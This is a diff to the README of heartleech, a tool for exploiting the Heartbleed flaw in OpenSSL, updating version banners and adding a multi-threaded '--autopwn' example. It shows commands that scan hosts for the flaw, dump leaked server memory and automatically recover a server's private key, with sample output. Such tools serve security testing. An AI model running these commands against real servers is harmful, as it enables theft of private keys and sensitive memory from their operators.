@@ -74,8 +74,8 @@ Here is an example for scanning:
 
     ./heartleech --scan www.google.com www.cloudflarechallenge.com www.robertgraham.com oa8gs7diyfuahl.com
 
-    --- heartleech/1.0.0e ---
-    from https://github.com/robertdavidgraham/heartleech
+    --- heartleech/1.0.0f ---
+    https://github.com/robertdavidgraham/heartleech
     www.google.com:443: SAFE
     www.cloudflarechallenge.com:443: VULNERABLE
     www.robertgraham.com:443: INCONCLUSIVE: TCP connect failed
@@ -94,8 +94,8 @@ Here is an example of dumping bleed information:
 
     ./heartleech www.cloudflarechallenge.com --dump challenge.bin --threads 10
 
-    --- heartleech/1.0.0e ---
-    from https://github.com/robertdavidgraham/heartleech
+    --- heartleech/1.0.0g ---
+    https://github.com/robertdavidgraham/heartleech
     7091376634 bytes downloaded (45.438-mbps)
 
 In this example, the script keeps reconnecting to the server, dumping more
@@ -115,11 +115,12 @@ through some other means.
 
 To automate the last two steps, do the following:
 
-    ./heartleech www.cloudflarechallenge.com --autopwn
+    ./heartleech www.cloudflarechallenge.com --autopwn --threads 20
     
 This will automatically fetch the certificate from the website, then continue
 downloading information until it finds a matching private key within the
-heartbleed information.
+heartbleed information. This example launches 20  threads, which on my home
+network downloads at 60-mbps.
 
 This tool supports IPv6. It may actually be using IPv6 without you knowing,
 if the first response from a DNS query of a domain name is an IPv6 address,
